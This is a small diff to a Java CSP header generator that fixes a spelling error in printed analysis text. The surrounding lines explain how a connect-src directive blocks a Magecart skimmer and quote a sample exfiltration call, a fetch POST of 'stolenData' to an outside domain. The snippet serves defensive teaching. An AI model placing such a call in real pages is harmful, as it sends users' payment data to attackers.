@@ -41,7 +41,7 @@ public class CSPHeaderGenerator {
         // Step 3: Security Analysis Output
         System.out.println("\n[ANALYSIS] If the Magecart script attempts to execute:");
         System.out.println("fetch('https://baways.com/log', { method: 'POST', body: stolenData });");
-        System.out.println("The browswer will intercept the request, check the 'connect-src' directive,");
+        System.out.println("The browser will intercept the request, check the 'connect-src' directive,");
         System.out.println("and explicitly BLOCK the transmission because 'baways.com' is not whitelisted.");
     }
     
